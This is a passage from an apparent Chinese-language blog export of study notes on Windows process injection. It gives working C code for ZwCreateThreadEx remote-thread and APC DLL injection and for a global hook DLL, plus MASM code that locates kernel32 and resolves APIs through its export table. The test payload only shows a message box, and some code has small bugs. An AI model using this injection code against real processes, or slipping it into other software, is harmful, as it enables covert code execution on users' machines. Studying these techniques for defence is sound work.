class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	int pid = atol(argv[1]);*/</span></span><br><span class="line">	injectCode(<span class="number">13968</span>);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要在release下生成</p>
<p><img src="/posts/843cce96/1.png" alt="img"></p>
]]></content>
      <categories>
        <category>用户态注入</category>
      </categories>
      <tags>
        <tag>用户态注入</tag>
      </tags>
  </entry>
  <entry>
    <title>ZwCreateThreadEx远程线程注入</title>
    <url>/posts/215f7b36/</url>
    <content><![CDATA[<p>session 0安全机制绕过注入</p>
<h4 id="session-0-隔离机制"><a href="#session-0-隔离机制" class="headerlink" title="session 0 隔离机制"></a>session 0 隔离机制</h4><p><a href="https://blog.csdn.net/suppercoder/article/details/17167537">https://blog.csdn.net/suppercoder/article/details/17167537</a></p>
<p><a href="https://www.cnblogs.com/gnielee/archive/2010/04/07/session0-isolation-part1.html">https://www.cnblogs.com/gnielee/archive/2010/04/07/session0-isolation-part1.html</a></p>
<p>session0会话: 在Windows XP、Windows Server 2003，以及更老版本的Windows操作系统中，服务和应用程序使用相同的会话（Session）运行，而这个会话是由第一个登录到控制台的用户启动的，这个会话即 Session0。</p>
<p>从Windows VISTA开始，只有服务可以托管到SESSION0中，用户应用程序和服务之间会进行隔离，并需要运行在用户登录系统时创建的后续会话中。</p>
<p>如第一个登录用户创建Session1，第二个登录用户创建Session2，以此类推。使用不同会话运行的实体（应用程序或服务）如果不将自己明确标注为全局命名空间，并提供相应的访问控制设置，那么将无法互相发送消息，共享UI元素或共享内核对象。</p>
<p><img src="/posts/215f7b36/1.png" alt="img"></p>
<h4 id="ZwCreateThreadEx函数"><a href="#ZwCreateThreadEx函数" class="headerlink" title="ZwCreateThreadEx函数"></a>ZwCreateThreadEx函数</h4><p>在Windows下NtCreateThreadEx是CreateRemoteThread的底层函数,但是NtCreateThreadEx 并未在ntdll.dll中声明 需要手动使用GetProcAddress函数将其地址导出。</p>
<p>在32位下和64位下结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* ZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span>	<span class="comment">//32</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* ZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">	DWORD dwStackSize,</span></span><br><span class="line"><span class="params">	DWORD dw1,</span></span><br><span class="line"><span class="params">	DWORD dw2,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><ul>
<li>1.OpenProcess 打开要注入的进程</li>
<li>2.VirtualAllocEx 在被注入的进程中申请写内存</li>
<li>3.WriteProcessMemory 写入dll路径到申请的内存中</li>
<li>4.LoadlibraryA、GetProcAddress  加载ntdll.dll以获取内核函数ZwCreateThreadEx地址</li>
<li>5.ZwCreateThreadEx 创建远线程实现dll注入</li>
<li>6.释放申请内存的句柄</li>
</ul>
<h4 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span>	<span class="comment">//32</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">	DWORD dwStackSize,</span></span><br><span class="line"><span class="params">	DWORD dw1,</span></span><br><span class="line"><span class="params">	DWORD dw2,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ZwCreateThreadExInjectDll</span><span class="params">(<span class="type">int</span> pid, <span class="type">char</span>* dllname)</span> &#123;</span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">strlen</span>(dllname) + <span class="number">1</span>;</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//shen</span></span><br><span class="line">	PVOID dllNameAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, len, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == dllNameAddr) &#123;</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	WriteProcessMemory(hProcess, dllNameAddr, dllname, len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	HMODULE ntdll = LoadLibraryA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	FARPROC funAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">	MyZwCreateThreadEx  ZwCreateThreadEx = (MyZwCreateThreadEx)GetProcAddress(ntdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);  <span class="comment">//强转一下类型</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//使用ZwCreateThreadEx创建远程线程</span></span><br><span class="line">	HANDLE remoteThread = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	ZwCreateThreadEx(&amp;remoteThread,PROCESS_ALL_ACCESS,<span class="literal">NULL</span>,hProcess,funAddr,dllNameAddr,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (remoteThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	FreeLibrary(ntdll);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//ZwCreateThreadExInjectDll(10288,&quot;C:\\Users\\test\\source\\repos\\用户层注入\\Debug\\hookdll.dll&quot;);</span></span><br><span class="line"></span><br><span class="line">	ZwCreateThreadExInjectDll(<span class="number">5584</span>,<span class="string">&quot;C:\\Users\\test\\source\\repos\\用户层注入\\x64\\Debug\\hookdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/posts/215f7b36/2.png" alt="img"></p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://www.cnblogs.com/iBinary/p/16026217.html">https://www.cnblogs.com/iBinary/p/16026217.html</a></p>
<p><a href="https://www.cnblogs.com/PeterZ1997/p/10596100.html">https://www.cnblogs.com/PeterZ1997/p/10596100.html</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/15318327.html">https://www.cnblogs.com/nice0e3/p/15318327.html</a></p>
]]></content>
      <categories>
        <category>用户态注入</category>
      </categories>
      <tags>
        <tag>用户态注入</tag>
      </tags>
  </entry>
  <entry>
    <title>APC注入</title>
    <url>/posts/5fe10d5b/</url>
    <content><![CDATA[<h4 id="APC简介"><a href="#APC简介" class="headerlink" title="APC简介"></a>APC简介</h4><p>APC(Asynchronous Procedure Calls,异步过程调用)</p>
<ul>
<li><p> <strong>每个线程都有一个自己的APC队列</strong>，可以使用<code>**QueueUserAPC**</code>把一个APC插入到线程APC队列中。当线程处于可警醒状态时，线程会执行APC队列中的APC函数。</p>
</li>
<li><p>线程创建后 系统会在调用线程函数时检查APC队列，如果不为空，那么就会调用APC队列中的APC函数，直到队列为空后才会调用线程函数。（线程通过调用<code>**SleepEx、SignalObjectAdndWait、WaitForSingleObjectEx、WaitForMultioleObjectsEx**</code>等函数挂起时（即进入[<code>alertable</code>]可惊醒状态时)， 会先检查APC队列，如果不为空，则调用APC队列中的APC函数，直到队列为空后才会开始等待要等待的对象。）  执行顺序以普通队列相同 <strong>先进先出(FIFO)<strong>。在整改执行过程中，线程并不会有任何异常举动，不易被差距，但是缺点是对于</strong>单线程程序一般不会存在挂起状态</strong>，所以APC注入不会对该类程序有明显效果。</p>
</li>
<li><p>由内核产生的APC称为内核态(kernel-mode)APC，用户应用调用的APC称为用户态(user-mode)APC。</p>
</li>
</ul>
<h4 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h4><h5 id="QueueUserAPC函数"><a href="#QueueUserAPC函数" class="headerlink" title="QueueUserAPC函数"></a>QueueUserAPC函数</h5><p>将用户模式异步过程调用（APC）对象添加到指定线程的APC队列</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">QueueUserAPC</span><span class="params">(</span></span><br><span class="line"><span class="params">  PAPCFUNC  pfnAPC,</span></span><br><span class="line"><span class="params">  HANDLE    hThread,</span></span><br><span class="line"><span class="params">  ULONG_PTR dwData</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<h5 id="APC注入具体流程"><a href="#APC注入具体流程" class="headerlink" title="APC注入具体流程"></a>APC注入具体流程</h5><ul>
<li>通过OpenProcess函数打开目标进程，获取目标进程句柄.</li>
<li>使用VirtualAllocEx在目标进程申请一块内存，然后通过WriteProcessMemory函数向内存中写入dll路径.</li>
<li>调用WIN32API函数CreateToolhelp32Snapshot、Thread32First、Thread32Next遍历线程快照，获取目标进程的所有线程ID.</li>
<li>遍历进程ID，调用OpenThread函数及THREAD_ALL_ACCESS访问权限打开线程，获取线程句柄。并调用QueueThread函数向线程插入APC函数，设置APC函数的地址为Loadlibrary函数的地址，并设置APC函数参数为上述DLL路径地址.</li>
<li>最后关闭句柄.</li>
</ul>
<h5 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ApcInjectDll</span><span class="params">(DWORD pid, <span class="type">char</span>* dllname)</span> &#123;</span><br><span class="line">	<span class="comment">//计算DLL文件名长度</span></span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">strlen</span>(dllname) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//打开目标进程</span></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//在目标进程申请一块长度为len大小的内存空间</span></span><br><span class="line">	PVOID dllNameAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, len, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (dllNameAddr == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//把DLL文件完整路径写到分配的内存里面</span></span><br><span class="line">	WriteProcessMemory(hProcess, dllNameAddr, dllname, len, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">	THREADENTRY32 te = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	te.dwSize = <span class="keyword">sizeof</span>(THREADENTRY32);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//得到线程快照</span></span><br><span class="line">	HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (handle == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//获取loadlibrary地址</span></span><br><span class="line">	FARPROC funAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"></span><br><span class="line">	Thread32First(handle, &amp;te);</span><br><span class="line">	<span class="keyword">while</span> (Thread32Next(handle, &amp;te))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (te.th32OwnerProcessID == pid)</span><br><span class="line">		&#123;</span><br><span class="line">			HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line">			<span class="keyword">if</span> (hThread)</span><br><span class="line">			&#123;</span><br><span class="line">				QueueUserAPC((PAPCFUNC)funAddr, hThread, dllNameAddr);</span><br><span class="line">				CloseHandle(hThread);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请输入pid&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> pid = atol(argv[<span class="number">1</span>]);</span><br><span class="line">	ApcInjectDll(pid, <span class="string">&quot;C:\\Users\\test\\Desktop\\hookdll.dll&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在notepad中 使用64位注入成功</p>
<p><img src="/posts/5fe10d5b/1.png" alt="img"></p>
<h4 id><a href="#" class="headerlink" title></a></h4><h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://www.cnblogs.com/nice0e3/p/15318330.html">https://www.cnblogs.com/nice0e3/p/15318330.html</a></p>
<p><a href="https://www.cnblogs.com/iBinary/p/7574055.html">https://www.cnblogs.com/iBinary/p/7574055.html</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/145644574">https://zhuanlan.zhihu.com/p/145644574</a></p>
<p><a href="https://www.cnblogs.com/PeterZ1997/p/10584557.html">https://www.cnblogs.com/PeterZ1997/p/10584557.html</a></p>
]]></content>
      <categories>
        <category>用户态注入</category>
      </categories>
      <tags>
        <tag>用户态注入</tag>
      </tags>
  </entry>
  <entry>
    <title>全局钩子注入</title>
    <url>/posts/69a3489c/</url>
    <content><![CDATA[<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// C C++混用 声明</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    _declspec(dllexport) <span class="type">void</span> <span class="title function_">OnHook</span><span class="params">()</span>;</span><br><span class="line">    _declspec(dllexport) <span class="type">void</span> <span class="title function_">OffHook</span><span class="params">()</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">HHOOK g_hook = <span class="literal">NULL</span>;  <span class="comment">//定义一个全局钩子遍历</span></span><br><span class="line">HINSTANCE instance = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        instance = hModule;</span><br><span class="line">        MessageBoxA(<span class="number">0</span>,<span class="string">&quot;text&quot;</span>, <span class="string">&quot;title&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">getMsgProc</span><span class="params">(<span class="type">int</span> code, WPARAM wparam, LPARAM lparam)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(g_hook, code, wparam, lparam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">OnHook</span><span class="params">()</span> &#123;</span><br><span class="line">    g_hook = SetWindowsHookEx(WH_GETMESSAGE, getMsgProc, instance, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">OffHook</span><span class="params">()</span> &#123;</span><br><span class="line">    UnhookWindowsHookEx(g_hook);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span><span class="params">(*hookOn)</span><span class="params">()</span>;   <span class="comment">//定义一个函数指针</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span><span class="params">(*hookOff)</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	HMODULE hmod = LoadLibraryA(<span class="string">&quot;hookdll.dll&quot;</span>);</span><br><span class="line">	hookOn hook_on = (hookOn)GetProcAddress(hmod, <span class="string">&quot;OnHook&quot;</span>);</span><br><span class="line">	hookOff hook_off = (hookOff)GetProcAddress(hmod, <span class="string">&quot;OffHook&quot;</span>);</span><br><span class="line"></span><br><span class="line">	hook_on();</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	hook_off();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>用户态注入</category>
      </categories>
      <tags>
        <tag>用户态注入</tag>
      </tags>
  </entry>
  <entry>
    <title>C-13_动态获取API函数地址</title>
    <url>/posts/9aa42a48/</url>
    <content><![CDATA[<h4 id="动态获取API入口地址方法"><a href="#动态获取API入口地址方法" class="headerlink" title="动态获取API入口地址方法"></a>动态获取API入口地址方法</h4><p>通常想要动态获取Api函数的地址，需要调用LoadlibraryA() 和GetProcAddress()函数动态获取。LoadlibraryA()用来加载API对应的dll，GetProcAddress()用来获取API函数对应的入口地址。</p>
<p>LoadLibraryA()和GetProcAddress()都是在kernel32.dll下引出的函数，在kernel32引出表中，所以需要先找到kernel32地址才能再去找kernel32的引出表地址。</p>
<p>一般有三种方法去找kernel32的基地址</p>
<ul>
<li>暴力搜索内存</li>
<li>seh异常处理链表搜索</li>
<li>TEB(Thread Environment Block)搜索</li>
</ul>
<h5 id="暴力搜索法"><a href="#暴力搜索法" class="headerlink" title="暴力搜索法"></a>暴力搜索法</h5><p><a href="https://www.cnblogs.com/witty/archive/2012/03/27/2419725.html">https://www.cnblogs.com/witty/archive/2012/03/27/2419725.html</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">.386</span>		</span><br><span class="line">.model flat,stdcall		</span><br><span class="line">option casemap:none		</span><br><span class="line">	</span><br><span class="line">include		windows.inc</span><br><span class="line"></span><br><span class="line">.data </span><br><span class="line">	lpKernel32 dd <span class="number">0</span></span><br><span class="line"></span><br><span class="line">.code </span><br><span class="line">	GetKernelBase proc uses esi edi dwKernel:dword</span><br><span class="line"></span><br><span class="line">		local kernelbase:dword</span><br><span class="line">		mov edi, dwKernel</span><br><span class="line">		and edi, <span class="number">0f</span>fff0000h   ; 初始化页</span><br><span class="line">		.<span class="keyword">while</span> TRUE</span><br><span class="line">			.<span class="keyword">if</span> word ptr [edi] == IMAGE_DOS_SIGNATURE  ;等于MZ?</span><br><span class="line">			mov esi, edi </span><br><span class="line">			add esi, [esi+IMAGE_DOS_HEADER.e_lfanew]	; esi+<span class="number">3</span>ch</span><br><span class="line">				.<span class="keyword">if</span> word ptr [esi] == IMAGE_NT_SIGNATURE   ;等于PE?</span><br><span class="line">					mov kernelbase, edi</span><br><span class="line">					.<span class="keyword">break</span></span><br><span class="line">				.endif</span><br><span class="line">			.endif</span><br><span class="line">			sub edi, <span class="number">010000</span>h    ;暴力搜索内存 <span class="number">64</span>kb 即每次减少<span class="number">64</span>kb</span><br><span class="line">		.<span class="keyword">break</span>	.<span class="keyword">if</span> edi &lt; <span class="number">070000000</span>h ;基地址小于<span class="number">70000000</span>h退出</span><br><span class="line">		.endw</span><br><span class="line">		</span><br><span class="line">		mov eax, kernelbase ; 存到寄存器中再返回</span><br><span class="line">		ret</span><br><span class="line">	GetKernelBase endp</span><br><span class="line"></span><br><span class="line">main proc</span><br><span class="line"></span><br><span class="line">	invoke GetKernelBase, [esp]</span><br><span class="line">	mov lpKernel32, eax</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">main endp</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">;找到导出表 找到导出表中 NumberOfNames字段（存放着导出函数的总个数）用这个个数构建一个循环</span><br><span class="line">;在 AddressOfNames   执行函数名称地址表 </span><br><span class="line">;循环中将每一项定义的函数名与所要搜索的函数名进行比较</span><br><span class="line">;如果没找到任何一个函数名符合 表示文件中没有该指定名称的函数</span><br><span class="line">;如果找到相符合的函数名 那么就几下这个函数名在字符串地址表中的索引值，然后在AddressOfNameOrdinals指向的数组中使用同样的索引值</span><br><span class="line">;使用该索引值 在AddressOfFunctions字段指向的函数入口地址表中获取的RVA即函数入口地址RVA</span><br><span class="line"></span><br><span class="line"><span class="number">.386</span>		</span><br><span class="line">.model flat,stdcall		</span><br><span class="line">option casemap:none		</span><br><span class="line">	</span><br><span class="line">include		windows.inc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data </span><br><span class="line">	lpKernel32 dd <span class="number">0</span></span><br><span class="line">	szUser32 db <span class="string">&#x27;user32.dll&#x27;</span>,<span class="number">0</span></span><br><span class="line">	lpUser32 dd <span class="number">0</span></span><br><span class="line">	szMessageBoxA db <span class="string">&#x27;MessageBoxA&#x27;</span>,<span class="number">0</span></span><br><span class="line">	lpMessageBoxA dd <span class="number">0</span></span><br><span class="line">	szLoadLibraryA db <span class="string">&#x27;LoadLibraryA&#x27;</span>,<span class="number">0</span></span><br><span class="line">	lpLoadLibraryA dd <span class="number">0</span></span><br><span class="line">	szExitProcess db <span class="string">&#x27;ExitProcess&#x27;</span>,<span class="number">0</span></span><br><span class="line">	lpExitProcess dd <span class="number">0</span></span><br><span class="line">	szGetProcAddress db <span class="string">&#x27;GetProcAddress&#x27;</span>,<span class="number">0</span></span><br><span class="line">	lpGetProcAddress dd <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	hola db <span class="string">&#x27;hola!&#x27;</span></span><br><span class="line"></span><br><span class="line">.code </span><br><span class="line"></span><br><span class="line">	GetKernelBase proc uses esi edi dwKernel:dword</span><br><span class="line"></span><br><span class="line">		local kernelbase:dword</span><br><span class="line">		mov edi, dwKernel</span><br><span class="line">		and edi, <span class="number">0f</span>fff0000h   ; 初始化页</span><br><span class="line">		.<span class="keyword">while</span> TRUE</span><br><span class="line">			.<span class="keyword">if</span> word ptr [edi] == IMAGE_DOS_SIGNATURE  ;等于MZ?</span><br><span class="line">			mov esi, edi </span><br><span class="line">			add esi, [esi+IMAGE_DOS_HEADER.e_lfanew]	; [esi+<span class="number">3</span>ch]</span><br><span class="line">				.<span class="keyword">if</span> word ptr [esi] == IMAGE_NT_SIGNATURE   ;等于PE?</span><br><span class="line">					mov kernelbase, edi</span><br><span class="line">					.<span class="keyword">break</span></span><br><span class="line">				.endif</span><br><span class="line">			.endif</span><br><span class="line">			sub edi, <span class="number">010000</span>h    ;暴力搜索内存 <span class="number">64</span>kb 即每次减少<span class="number">64</span>kb   </span><br><span class="line">				;kernel32.dll的块对齐值是<span class="number">00001000</span>h, 并且一般DLL以<span class="number">1</span>M为边界，通过<span class="number">10000</span>h (<span class="number">64</span>k) 作为跨度</span><br><span class="line">		.<span class="keyword">break</span>	.<span class="keyword">if</span> edi &lt; <span class="number">070000000</span>h ;基地址小于<span class="number">70000000</span>h退出</span><br><span class="line">		.endw</span><br><span class="line">		</span><br><span class="line">		mov eax, kernelbase ; 存到寄存器中再返回</span><br><span class="line">		ret</span><br><span class="line">	GetKernelBase endp</span><br><span class="line"></span><br><span class="line">;hMoudle 基地址</span><br><span class="line">	GetApi proc hModule:dword, szApiname:dword</span><br><span class="line">		local apilen:dword	;local声明局部遍历</span><br><span class="line">		local apibase:dword</span><br><span class="line"></span><br><span class="line">		pushad</span><br><span class="line">		;计算api字符长度</span><br><span class="line">		